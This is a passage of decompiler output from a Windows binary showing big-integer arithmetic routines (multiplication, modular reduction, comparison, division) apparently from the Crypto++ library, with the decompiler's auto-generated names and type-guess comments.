  v2 = sub_13F1215D0((__int64)v13, *(_QWORD *)(a1 + 48) << 6);
  sub_13F11FD00(v2, (__int64)v9, a1 + 24);
  v3 = sub_13F113500(a1 + 120, (__int64)v9);
  v4 = v11;
  if ( v10 < v11 )
    v4 = v10;
  v5 = (__int64)v12;
  if ( v12 )
  {
    memset(v12, 0, 8 * v4);
    sub_13F12E4D0(v5);
  }
  v6 = v15;
  if ( v14 < v15 )
    v6 = v14;
  v7 = (__int64)v16;
  if ( v16 )
  {
    memset(v16, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  return v3;
}
// 13F120170: using guessed type char var_40[16];

//----- (000000013F120230) ----------------------------------------------------
__int64 __fastcall sub_13F120230(__int64 a1, __int64 (__fastcall *(**a2)[4])())
{
  __int64 (__fastcall *(*v3)[4])(); // rax
  __int64 (__fastcall *(*v4)[4])(); // r8
  __int64 (__fastcall **v5)(); // rdi
  __int64 result; // rax
  __int64 v7; // rbx
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  char v10[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+38h] [rbp-30h]
  unsigned __int64 v12; // [rsp+40h] [rbp-28h]
  void *v13; // [rsp+48h] [rbp-20h]

  v3 = a2[3];
  v4 = a2[4];
  if ( v3 )
  {
    v5 = &(*v4)[(_QWORD)v3 - 1];
    do
    {
      if ( *v5 )
        break;
      --v5;
      v3 = (__int64 (__fastcall *(*)[4])())((char *)v3 - 1);
    }
    while ( v3 );
  }
  if ( (_DWORD)v3 != 1 || (*v4)[0] != (__int64 (__fastcall *)())1 )
    LOBYTE(v3) = 0;
  if ( !(_BYTE)v3 )
    a2 = &off_13F1C4398;
  sub_13F112A00((__int64)v10, (__int64)a2);
  result = sub_13F113500(a1 + 72, (__int64)v10);
  v7 = result;
  v8 = v12;
  if ( v11 < v12 )
    v8 = v11;
  v9 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v8);
    sub_13F12E4D0(v9);
    return v7;
  }
  return result;
}
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();

//----- (000000013F1202F0) ----------------------------------------------------
__int64 __fastcall sub_13F1202F0(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  unsigned __int64 v5; // rcx
  __int64 v6; // rdx
  __int64 v7; // rax
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 result; // rax
  __int64 v11; // rbx
  unsigned __int64 v12; // rcx
  __int64 v13; // rdx
  char v14[16]; // [rsp+20h] [rbp-A8h] BYREF
  unsigned __int64 v15; // [rsp+30h] [rbp-98h]
  unsigned __int64 v16; // [rsp+38h] [rbp-90h]
  void *v17; // [rsp+40h] [rbp-88h]
  __int64 v18; // [rsp+50h] [rbp-78h]
  __int64 v19; // [rsp+58h] [rbp-70h] BYREF
  unsigned __int64 v20; // [rsp+68h] [rbp-60h]
  unsigned __int64 v21; // [rsp+70h] [rbp-58h]
  void *v22; // [rsp+78h] [rbp-50h]
  char v23[16]; // [rsp+88h] [rbp-40h] BYREF
  unsigned __int64 v24; // [rsp+98h] [rbp-30h]
  unsigned __int64 v25; // [rsp+A0h] [rbp-28h]
  void *v26; // [rsp+A8h] [rbp-20h]

  v18 = -2i64;
  if ( *(_DWORD *)(a2 + 40) == 1 )
  {
    v4 = sub_13F11FD00(a2, (__int64)&v19, a1 + 24);
    sub_13F11EF70(v4, (__int64)v14, a1 + 24);
    v5 = v21;
    if ( v20 < v21 )
      v5 = v20;
    v6 = (__int64)v22;
    if ( v22 )
    {
      memset(v22, 0, 8 * v5);
      sub_13F12E4D0(v6);
    }
  }
  else if ( *(_DWORD *)(a1 + 64) == 1 || (int)sub_13F121140(a2, a1 + 24) >= 0 )
  {
    v7 = sub_13F11FD00(a2, (__int64)v23, a1 + 24);
    sub_13F11EF70(v7, (__int64)v14, a1 + 24);
    v8 = v25;
    if ( v24 < v25 )
      v8 = v24;
    v9 = (__int64)v26;
    if ( v26 )
    {
      memset(v26, 0, 8 * v8);
      sub_13F12E4D0(v9);
    }
  }
  else
  {
    sub_13F11EF70(a2, (__int64)v14, a1 + 24);
  }
  result = sub_13F113500(a1 + 120, (__int64)v14);
  v11 = result;
  v12 = v16;
  if ( v15 < v16 )
    v12 = v15;
  v13 = (__int64)v17;
  if ( v17 )
  {
    memset(v17, 0, 8 * v12);
    sub_13F12E4D0(v13);
    return v11;
  }
  return result;
}
// 13F1202F0: using guessed type char var_40[16];

//----- (000000013F120450) ----------------------------------------------------
__int64 __fastcall sub_13F120450(__int64 a1, __int64 a2)
{
  __m128i *v2; // r14
  const __m128i *v4; // r8
  __m128i *v6; // rsi
  unsigned __int64 v7; // rbx
  __int64 v8; // rax
  unsigned __int64 v9; // rbp
  unsigned int v10; // eax
  __int64 v11; // r14
  unsigned __int64 v12; // rbp
  unsigned __int64 v13; // rdx
  unsigned __int64 v14; // rax
  __int64 v15; // rdi

  v2 = *(__m128i **)(a1 + 240);
  v4 = *(const __m128i **)(a2 + 32);
  v6 = *(__m128i **)(a1 + 104);
  v7 = *(_QWORD *)(a1 + 48);
  v8 = *(_QWORD *)(a2 + 24);
  if ( v2 != v4 )
  {
    sub_13F10D330(*(__m128i **)(a1 + 240), 8 * v8, v4, 8 * v8);
    v8 = *(_QWORD *)(a2 + 24);
  }
  if ( 2 * v7 != v8 )
    memset((char *)v2 + 8 * v8, 0, 8 * (2 * v7 - v8));
  sub_13F120000(
    v6,
    (unsigned __int64 *)&v2[v7],
    (unsigned __int64 *)v2,
    *(unsigned __int64 **)(a1 + 56),
    *(unsigned __int64 **)(a1 + 200),
    v7);
  v9 = v7 << 6;
  v10 = sub_13F114850(v6, v2, v6, v7, *(const __m128i **)(a1 + 56), v7);
  v11 = *(_QWORD *)(a1 + 56);
  if ( v10 <= v7 << 6 )
  {
    v12 = v9 - v10;
    while ( v12 )
    {
      --v12;
      v13 = 0i64;
      v14 = 0i64;
      if ( v7 )
      {
        do
        {
          v15 = v6->m128i_i64[v14];
          v6->m128i_i64[v14++] = v13 | (2 * v15);
          v13 = (unsigned __int64)v15 >> 63;
        }
        while ( v14 < v7 );
        if ( v15 < 0 )
          goto LABEL_12;
      }
      if ( (int)sub_13F11C4E0((__int64)v6, v11, v7) >= 0 )
LABEL_12:
        sub_13F13A520(v7, (__int64)v6, (__int64)v6, v11);
    }
  }
  else
  {
    sub_13F11D1C0(v6, v6, v10 - v9, v11, v7);
  }
  return a1 + 72;
}

//----- (000000013F1205B0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1205B0(__int64 a1, __int64 a2, __int64 a3)
{
  __m128i *v6; // rax
  __int64 v7; // rbx
  __m128i *v8; // rbp
  unsigned __int64 v9; // rsi
  __int64 v10; // rdx
  __int64 v11; // rax
  __int64 *v12; // rcx
  __int64 v13; // rax
  __m128i *v14; // rcx
  __int64 (__fastcall **v16)(); // [rsp+28h] [rbp-40h] BYREF
  char v17[8]; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+38h] [rbp-30h]
  __m128i *v19; // [rsp+48h] [rbp-20h]
  int v20; // [rsp+50h] [rbp-18h]

  v16 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v6 = (__m128i *)sub_13F123740((__int64)v17, 2ui64);
  v19 = v6;
  v20 = 0;
  v6->m128i_i64[1] = 0i64;
  v6->m128i_i64[0] = 0i64;
  sub_13F120710((__int64)&v16, a2, a3);
  v7 = a1 + 72;
  v8 = v19;
  v9 = si128.m128i_u64[1];
  if ( (__int64 (__fastcall ***)())v7 != &v16 )
  {
    v10 = *(_QWORD *)(v7 + 24);
    if ( v10 != si128.m128i_i64[1] || !v19->m128i_i64[(unsigned __int64)si128.m128i_i64[1] >> 1] )
    {
      v11 = si128.m128i_i64[1];
      if ( si128.m128i_i64[1] )
      {
        v12 = &v19[-1].m128i_i64[si128.m128i_i64[1] + 1];
        do
        {
          if ( *v12 )
            break;
          --v12;
          --v11;
        }
        while ( v11 );
      }
      v13 = sub_13F122180((unsigned int)v11);
      sub_13F120E60((_QWORD *)(v7 + 8), v13);
      v10 = *(_QWORD *)(v7 + 24);
    }
    v14 = *(__m128i **)(v7 + 32);
    if ( v14 != v8 )
      sub_13F10D330(v14, 8 * v10, v8, 8 * v10);
    *(_DWORD *)(v7 + 40) = v20;
  }
  if ( si128.m128i_i64[0] < v9 )
    v9 = si128.m128i_i64[0];
  if ( v8 )
  {
    memset(v8, 0, 8 * v9);
    sub_13F12E4D0((__int64)v8);
  }
  return v7;
}
// 13F1205E8: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1205B0: using guessed type char var_38[8];

//----- (000000013F120710) ----------------------------------------------------
char __fastcall sub_13F120710(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  _QWORD *v7; // rdi
  __int64 v8; // r13
  __int64 v9; // rcx
  _QWORD *v10; // rdx
  __int64 v11; // r12
  unsigned __int64 v12; // r14
  __int64 v13; // rdx
  __int64 v14; // rcx
  _QWORD *v15; // r15
  __int64 v16; // rax
  int v17; // edx
  _QWORD *v18; // rcx
  _QWORD *v19; // rcx
  char v21[8]; // [rsp+38h] [rbp-50h] BYREF
  __int64 v22; // [rsp+40h] [rbp-48h]
  __int64 v23; // [rsp+48h] [rbp-40h]
  _QWORD *v24; // [rsp+50h] [rbp-38h]

  v6 = *(_QWORD *)(a2 + 24);
  if ( v6 )
  {
    v7 = (_QWORD *)(*(_QWORD *)(a2 + 32) + 8 * (v6 - 1));
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  v8 = sub_13F122180((unsigned int)v6);
  v9 = *(_QWORD *)(a3 + 24);
  if ( v9 )
  {
    v10 = (_QWORD *)(*(_QWORD *)(a3 + 32) + 8 * v9 - 8);
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v9;
    }
    while ( v9 );
  }
  v11 = sub_13F122180((unsigned int)v9);
  v12 = v11 + v8;
  v13 = sub_13F122180(v11 + v8);
  sub_13F120E60((_QWORD *)(a1 + 8), v13);
  v14 = *(_QWORD *)(a1 + 32);
  if ( v14 )
    sub_13F15EF70(v14, 0, 8i64 * *(_QWORD *)(a1 + 24));
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_DWORD *)(a1 + 40) = 0;
  v22 = 0x1FFFFFFFFFFFFFFFi64;
  v23 = v11 + v8;
  v15 = (_QWORD *)sub_13F123740((__int64)v21, v12);
  v24 = v15;
  sub_13F114E80(*(__m128i **)(a1 + 32), v15, *(unsigned __int64 **)(a2 + 32), v8, *(unsigned __int64 **)(a3 + 32), v11);
  if ( v12 > 0x1FFFFFFFFFFFFFFFi64 )
    v12 = 0x1FFFFFFFFFFFFFFFi64;
  if ( v15 )
  {
    memset(v15, 0, 8 * v12);
    sub_13F12E4D0((__int64)v15);
  }
  LOBYTE(v16) = *(_DWORD *)(a3 + 40) != 1;
  if ( (*(_DWORD *)(a2 + 40) != 1) != (_BYTE)v16 )
  {
    v17 = *(_DWORD *)(a1 + 40);
    if ( v17 == 1 )
      goto LABEL_23;
    v18 = *(_QWORD **)(a1 + 32);
    if ( *v18 )
      goto LABEL_23;
    v16 = *(_QWORD *)(a1 + 24);
    if ( v16 )
    {
      v19 = &v18[v16 - 1];
      do
      {
        if ( *v19 )
          break;
        --v19;
        --v16;
      }
      while ( v16 );
    }
    if ( (_DWORD)v16 )
    {
LABEL_23:
      LOBYTE(v16) = 1 - v17;
      *(_DWORD *)(a1 + 40) = 1 - v17;
    }
  }
  return v16;
}
// 13F120710: using guessed type char var_50[8];

//----- (000000013F1208C0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1208C0(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rbx
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // rdx
  __int64 (__fastcall **v13)(); // [rsp+28h] [rbp-70h] BYREF
  char v14[8]; // [rsp+30h] [rbp-68h] BYREF
  __m128i si128; // [rsp+38h] [rbp-60h]
  void *v16; // [rsp+48h] [rbp-50h]
  int v17; // [rsp+50h] [rbp-48h]
  char v18[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v19; // [rsp+68h] [rbp-30h]
  unsigned __int64 v20; // [rsp+70h] [rbp-28h]
  void *v21; // [rsp+78h] [rbp-20h]

  v13 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v6 = (_QWORD *)sub_13F123740((__int64)v14, 2ui64);
  v16 = v6;
  v17 = 0;
  v6[1] = 0i64;
  *v6 = 0i64;
  sub_13F120710((__int64)&v13, a2, a3);
  sub_13F11FD00((__int64)&v13, (__int64)v18, a1 + 24);
  v7 = sub_13F113500(a1 + 120, (__int64)v18);
  v8 = v20;
  if ( v19 < v20 )
    v8 = v19;
  v9 = (__int64)v21;
  if ( v21 )
  {
    memset(v21, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  v10 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v10 = si128.m128i_i64[0];
  v11 = (__int64)v16;
  if ( v16 )
  {
    memset(v16, 0, 8 * v10);
    sub_13F12E4D0(v11);
  }
  return v7;
}
// 13F1208FB: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1208C0: using guessed type char var_68[8];

//----- (000000013F1209F0) ----------------------------------------------------
__int64 __fastcall sub_13F1209F0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v4; // r15
  __m128i *v6; // r14
  __m128i *v8; // r12
  __m128i *v9; // rbp
  __int64 v10; // rdx
  __int64 v11; // rax
  __int64 v12; // rcx

  v4 = *(_QWORD *)(a1 + 48);
  v6 = *(__m128i **)(a1 + 240);
  v8 = *(__m128i **)(a1 + 104);
  v9 = &v6[v4];
  sub_13F114E80(
    v6,
    v9,
    *(unsigned __int64 **)(a2 + 32),
    *(_QWORD *)(a2 + 24),
    *(unsigned __int64 **)(a3 + 32),
    *(_QWORD *)(a3 + 24));
  v10 = *(_QWORD *)(a3 + 24);
  v11 = *(_QWORD *)(a2 + 24);
  v12 = 2 * v4 - v10 - v11;
  if ( v12 )
    memset((char *)v6 + 8 * v10 + 8 * v11, 0, 8 * v12);
  sub_13F120000(
    v8,
    (unsigned __int64 *)v9,
    (unsigned __int64 *)v6,
    *(unsigned __int64 **)(a1 + 56),
    *(unsigned __int64 **)(a1 + 200),
    v4);
  return a1 + 72;
}

//----- (000000013F120AC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F120AC0(
        unsigned __int64 *a1,
        _QWORD *a2,
        __int64 a3,
        unsigned __int64 *a4,
        unsigned __int64 *a5,
        unsigned __int64 a6)
{
  unsigned __int64 result; // rax
  unsigned int v10; // esi
  int v11; // er15
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r12
  unsigned __int64 *v15; // rax
  unsigned __int64 v16; // r9
  unsigned __int64 v17; // rdx
  int v18; // eax
  unsigned __int64 v19; // r13
  unsigned __int64 v20; // rcx
  unsigned __int64 *v21; // rax
  unsigned __int64 v22; // rdx
  int v23; // eax
  unsigned __int64 v24; // rbx
  unsigned __int64 *v25; // r12
  char *v26; // r14
  BOOL v27; // eax
  BOOL v28; // ebp
  unsigned __int64 v29; // rcx
  unsigned __int64 *v30; // rax
  unsigned __int64 v31; // rdx
  int v32; // eax
  BOOL v33; // er13
  BOOL v34; // ebx
  unsigned __int64 v35; // rcx
  unsigned __int64 *v36; // rax
  unsigned __int64 v37; // rdx
  int v38; // eax
  int v39; // ebp
  unsigned __int64 v40; // r8
  unsigned __int64 v41; // rdx
  unsigned int v42; // ecx
  __int64 v43; // rax
  bool v44; // zf
  int v45; // ebx
  unsigned __int64 v46; // rdx
  unsigned __int64 v47; // rcx
  unsigned __int64 *v51; // [rsp+98h] [rbp+30h]

  if ( a6 <= 0x10 )
    return ((unsigned __int64 (__fastcall *)(unsigned __int64 *, unsigned __int64 *, unsigned __int64 *))funcs_13F120B11[a6 >> 2])(
             a1,
             a4,
             a5);
  v10 = 1;
  v11 = 0;
  v12 = a6 >> 1;
  v13 = a6 >> 1;
  v14 = a6 >> 1;
  v51 = &a4[v14];
  if ( a6 >> 1 )
  {
    v15 = &a4[v12];
    v16 = a6 >> 1;
    while ( 1 )
    {
      v17 = *--v15;
      --v13;
      if ( v17 > v15[v16] )
        break;
      if ( v17 < v15[v16] )
      {
        v18 = -1;
        goto LABEL_9;
      }
      if ( !v13 )
        goto LABEL_8;
    }
    v18 = 1;
  }
  else
  {
LABEL_8:
    v18 = 0;
  }
LABEL_9:
  v19 = a6 >> 1;
  if ( v18 > 0 )
    v19 = 0i64;
  sub_13F13A520(v12, (__int64)a1, (__int64)&a4[v19], (__int64)&a4[v12 ^ v19]);
  v20 = a6 >> 1;
  if ( v12 )
  {
    v21 = &a5[v14];
    while ( 1 )
    {
      v22 = *--v21;
      --v20;
      if ( v22 > v21[v14] )
        break;
      if ( v22 < v21[v14] )
      {
        v23 = -1;
        goto LABEL_17;
      }
      if ( !v20 )
        goto LABEL_16;
    }
    v23 = 1;
  }
  else
  {
LABEL_16:
    v23 = 0;
  }
LABEL_17:
  v24 = a6 >> 1;
  if ( v23 > 0 )
    v24 = 0i64;
  v25 = &a1[v14];
  sub_13F13A520(v12, (__int64)v25, (__int64)&a5[v24], (__int64)&a5[v12 ^ v24]);
  v26 = (char *)&a2[a6];
  sub_13F121B80(a2, v26, a1, v25, v12);
  sub_13F121B80(a1, v26, v51, &a5[v12], v12);
  v27 = sub_13F13A520(v12, (__int64)v26, a3 + 8 * v12, a3);
  if ( v19 == v24 )
  {
    v28 = v27 - sub_13F13A4D0(v12, (__int64)v26, (__int64)v26, (__int64)a2);
    v29 = v12;
    if ( v12 )
    {
      v30 = v25;
      while ( 1 )
      {
        v31 = *(unsigned __int64 *)((char *)v30-- + v26 - (char *)a1 - 8);
        --v29;
        if ( v31 > *v30 )
          break;
        if ( v31 < *v30 )
        {
          v32 = -1;
          goto LABEL_26;
        }
        if ( !v29 )
          goto LABEL_25;
      }
      v32 = 1;
    }
    else
    {
LABEL_25:
      v32 = 0;
    }
LABEL_26:
    v33 = v32 == -1;
    v34 = v33 - sub_13F13A520(v12, (__int64)v26, (__int64)v26, (__int64)&a2[v12]);
  }
  else
  {
    v28 = sub_13F13A520(v12, (__int64)v26, (__int64)v26, (__int64)a2) + v27;
    v35 = v12;
    if ( v12 )
    {
      v36 = v25;
      while ( 1 )
      {
        v37 = *(unsigned __int64 *)((char *)v36-- + v26 - (char *)a1 - 8);
        --v35;
        if ( v37 > *v36 )
          break;
        if ( v37 < *v36 )
        {
          v38 = -1;
          goto LABEL_39;
        }
        if ( !v35 )
          goto LABEL_38;
      }
      v38 = 1;
    }
    else
    {
LABEL_38:
      v38 = 0;
    }
LABEL_39:
    v33 = v38 == -1;
    v34 = sub_13F13A4D0(v12, (__int64)v26, (__int64)v26, (__int64)&a2[v12]) + v33;
  }
  v39 = v33 + v28;
  if ( v39 < 0 )
  {
    v45 = v34 - sub_13F11CA30((unsigned __int64 *)v26, v12, -v39);
  }
  else
  {
    v40 = *(_QWORD *)v26;
    v41 = *(_QWORD *)v26 + v39;
    *(_QWORD *)v26 = v41;
    if ( v41 < v40 )
    {
      v42 = 1;
      if ( v12 <= 1 )
      {
LABEL_46:
        v11 = 1;
      }
      else
      {
        v43 = 1i64;
        while ( 1 )
        {
          v44 = (*(_QWORD *)&v26[8 * v43])++ == -1i64;
          if ( !v44 )
            break;
          v43 = ++v42;
          if ( v42 >= v12 )
            goto LABEL_46;
        }
      }
    }
    v45 = v11 + v34;
  }
  result = sub_13F13A4D0(v12, (__int64)a1, (__int64)v26, (__int64)v25);
  v46 = *v25;
  v47 = *v25 + (int)result + v45;
  *v25 = v47;
  if ( v47 < v46 && v12 > 1 )
  {
    result = 1i64;
    do
    {
      v44 = v25[result]++ == -1i64;
      if ( !v44 )
        break;
      result = ++v10;
    }
    while ( v10 < v12 );
  }
  return result;
}
// 13F1C4520: using guessed type __int64 (__fastcall *funcs_13F120B11[3])();

//----- (000000013F120E60) ----------------------------------------------------
__int64 __fastcall sub_13F120E60(_QWORD *a1, unsigned __int64 a2)
{
  void *v2; // r8
  __int64 v4; // rcx
  __int64 result; // rax

  v2 = (void *)a1[3];
  v4 = a1[2];
  if ( v4 != a2 )
  {
    if ( v2 )
    {
      memset(v2, 0, 8 * v4);
      sub_13F12E4D0((__int64)v2);
    }
    v2 = (void *)sub_13F123740((__int64)a1, a2);
  }
  result = 0x1FFFFFFFFFFFFFFFi64;
  a1[3] = v2;
  a1[1] = 0x1FFFFFFFFFFFFFFFi64;
  a1[2] = a2;
  return result;
}

//----- (000000013F120ED0) ----------------------------------------------------
__int64 __fastcall sub_13F120ED0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // r8
  __int64 v7; // r8
  __int64 v8; // rdx

  v6 = *(_QWORD *)(a1 + 24);
  if ( v6 < *(_QWORD *)(a3 + 24) )
    v6 = *(_QWORD *)(a3 + 24);
  sub_13F112960(a2, 0i64, v6);
  if ( *(_DWORD *)(a1 + 40) != 1 )
  {
    v7 = a3;
    v8 = a1;
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0(a2, a1, a3);
      return a2;
    }
    goto LABEL_8;
  }
  if ( *(_DWORD *)(a3 + 40) != 1 )
  {
    v7 = a1;
    v8 = a3;
LABEL_8:
    sub_13F1213E0(a2, v8, v7);
    return a2;
  }
  sub_13F120FA0(a2, a1, a3);
  *(_DWORD *)(a2 + 40) = 1;
  return a2;
}

//----- (000000013F120FA0) ----------------------------------------------------
__int64 __fastcall sub_13F120FA0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v3; // rbp
  unsigned __int64 v5; // r14
  __int64 v7; // r9
  __int64 v9; // r8
  __int64 v10; // rdx
  __int64 result; // rax
  __int64 v12; // r9
  __int64 v13; // rdx
  __int64 v14; // r10
  __int64 v15; // rbp
  const __m128i *v16; // r8
  __m128i *v17; // rcx
  unsigned __int64 *v18; // r8
  unsigned __int64 v19; // rdx
  unsigned int v20; // ecx
  unsigned __int64 v21; // r10
  bool v22; // zf
  __int64 v23; // r15
  __int64 v24; // r9
  __int64 v25; // r10
  const __m128i *v26; // r8
  __m128i *v27; // rcx
  unsigned __int64 v28; // rdx
  _QWORD *v29; // r8
  unsigned int v30; // ecx
  unsigned __int64 v31; // r10

  v3 = *(_QWORD *)(a2 + 24);
  v5 = *(_QWORD *)(a3 + 24);
  v7 = *(_QWORD *)(a3 + 32);
  v9 = *(_QWORD *)(a2 + 32);
  v10 = *(_QWORD *)(a1 + 32);
  if ( v3 > v5 )
  {
    result = sub_13F13A4D0(v5, v10, v9, v7);
    v12 = *(_QWORD *)(a3 + 24);
    v13 = *(_QWORD *)(a1 + 32);
    v14 = *(_QWORD *)(a2 + 24);
    v15 = (int)result;
    v16 = (const __m128i *)(*(_QWORD *)(a2 + 32) + 8 * v12);
    v17 = (__m128i *)(v13 + 8 * v12);
    if ( v17 != v16 )
    {
      result = sub_13F10D330(v17, 8 * (v14 - v12), v16, 8 * (v14 - v12));
      v14 = *(_QWORD *)(a2 + 24);
      v12 = *(_QWORD *)(a3 + 24);
      v13 = *(_QWORD *)(a1 + 32);
    }
    v18 = (unsigned __int64 *)(v13 + 8 * v12);
    v19 = *v18;
    *v18 += v15;
    if ( v19 + v15 >= v19 )
      goto LABEL_21;
    v20 = 1;
    v21 = v14 - v12;
    if ( v21 > 1 )
    {
      result = 1i64;
      while ( 1 )
      {
        v22 = v18[result]++ == -1i64;
        if ( !v22 )
          goto LABEL_21;
        result = ++v20;
        if ( v20 >= v21 )
          goto LABEL_20;
      }
    }
    goto LABEL_20;
  }
  result = sub_13F13A4D0(v3, v10, v9, v7);
  v23 = (int)result;
  if ( v3 == v5 )
  {
    if ( !(_DWORD)result )
      goto LABEL_21;
    goto LABEL_20;
  }
  v24 = *(_QWORD *)(a2 + 24);
  v25 = *(_QWORD *)(a3 + 24);
  v26 = (const __m128i *)(*(_QWORD *)(a3 + 32) + 8 * v24);
  result = *(_QWORD *)(a1 + 32);
  v27 = (__m128i *)(result + 8 * v24);
  if ( v27 != v26 )
  {
    sub_13F10D330(v27, 8 * (v25 - v24), v26, 8 * (v25 - v24));
    v25 = *(_QWORD *)(a3 + 24);
    v24 = *(_QWORD *)(a2 + 24);
    result = *(_QWORD *)(a1 + 32);
  }
  v28 = *(_QWORD *)(result + 8 * v24);
  v29 = (_QWORD *)(result + 8 * v24);
  *v29 = v28 + v23;
  if ( v28 + v23 >= v28 )
    goto LABEL_21;
  v30 = 1;
  v31 = v25 - v24;
  if ( v31 <= 1 )
  {
LABEL_20:
    sub_13F11C2E0((_QWORD *)(a1 + 8), 2i64 * *(_QWORD *)(a1 + 24));
    result = *(_QWORD *)(a1 + 32);
    *(_QWORD *)(result + 8i64 * (*(_QWORD *)(a1 + 24) >> 1)) = 1i64;
    goto LABEL_21;
  }
  result = 1i64;
  while ( 1 )
  {
    v22 = v29[result]++ == -1i64;
    if ( !v22 )
      break;
    result = ++v30;
    if ( v30 >= v31 )
      goto LABEL_20;
  }
LABEL_21:
  *(_DWORD *)(a1 + 40) = 0;
  return result;
}

//----- (000000013F121140) ----------------------------------------------------
__int64 __fastcall sub_13F121140(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // r9
  _QWORD *v4; // rcx
  __int64 v5; // rcx
  __int64 v6; // r8
  _QWORD *v7; // rdx
  bool v8; // cc
  __int64 result; // rax
  __int64 v10; // rcx
  unsigned __int64 *v11; // rax
  __int64 v12; // r9
  unsigned __int64 v13; // rdx

  v2 = *(_QWORD *)(a1 + 24);
  v3 = *(_QWORD *)(a1 + 32);
  if ( v2 )
  {
    v4 = (_QWORD *)(v3 + 8 * (v2 - 1));
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v2;
    }
    while ( v2 );
  }
  v5 = *(_QWORD *)(a2 + 24);
  v6 = *(_QWORD *)(a2 + 32);
  if ( v5 )
  {
    v7 = (_QWORD *)(v6 + 8 * (v5 - 1));
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v5;
    }
    while ( v5 );
  }
  v8 = (unsigned int)v2 <= (unsigned int)v5;
  if ( (_DWORD)v2 == (_DWORD)v5 )
  {
    v10 = (unsigned int)v2;
    if ( (_DWORD)v2 )
    {
      v11 = (unsigned __int64 *)(v6 + 8i64 * (unsigned int)v2);
      v12 = v3 - v6;
      while ( 1 )
      {
        v13 = *(unsigned __int64 *)((char *)v11-- + v12 - 8);
        --v10;
        if ( v13 > *v11 )
          break;
        if ( v13 < *v11 )
          return 0xFFFFFFFFi64;
        if ( !v10 )
          return 0i64;
      }
      return 1i64;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    result = 0xFFFFFFFFi64;
    if ( !v8 )
      return 1i64;
  }
  return result;
}

//----- (000000013F1211E0) ----------------------------------------------------
__m128i *__fastcall sub_13F1211E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rdx
  _QWORD *v9; // rax
  __int64 v10; // rdi
  _QWORD *v11; // rax
  __m128i *result; // rax
  unsigned int v13; // er12
  unsigned int v14; // edi
  __int64 v15; // rax
  __int64 v16; // rcx
  __int64 v17; // rax
  __int64 v18; // rcx
  _QWORD *v19; // rbx
  char pExceptionObject[8]; // [rsp+50h] [rbp-98h] BYREF
  __int64 v21; // [rsp+58h] [rbp-90h]
  unsigned __int64 v22; // [rsp+60h] [rbp-88h]
  _QWORD *v23; // [rsp+68h] [rbp-80h]

  v8 = *(_QWORD *)(a3 + 24);
  if ( v8 )
  {
    v9 = (_QWORD *)(*(_QWORD *)(a3 + 32) + 8 * v8 - 8);
    do
    {
      if ( *v9 )
        break;
      --v9;
      --v8;
    }
    while ( v8 );
  }
  v10 = *(_QWORD *)(a4 + 24);
  if ( v10 )
  {
    v11 = (_QWORD *)(*(_QWORD *)(a4 + 32) + 8 * v10 - 8);
    do
    {
      if ( *v11 )
        break;
      --v11;
      --v10;
    }
    while ( v10 );
  }
  if ( !(_DWORD)v10 )
  {
    sub_13F112880((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  if ( (unsigned int)v8 >= (unsigned int)v10 )
  {
    v13 = v8 + (v8 & 1);
    v14 = (v10 & 1) + v10;
    v15 = sub_13F122180(v14);
    sub_13F120E60((_QWORD *)(a1 + 8), v15);
    v16 = *(_QWORD *)(a1 + 32);
    if ( v16 )
      sub_13F15EF70(v16, 0, 8i64 * *(_QWORD *)(a1 + 24));
    *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
    *(_DWORD *)(a1 + 40) = 0;
    v17 = sub_13F122180(v13 - v14 + 2);
    sub_13F120E60((_QWORD *)(a2 + 8), v17);
    v18 = *(_QWORD *)(a2 + 32);
    if ( v18 )
      sub_13F15EF70(v18, 0, 8i64 * *(_QWORD *)(a2 + 24));
    *(_QWORD *)(a2 + 16) = 0x1FFFFFFFFFFFFFFFi64;
    *(_DWORD *)(a2 + 40) = 0;
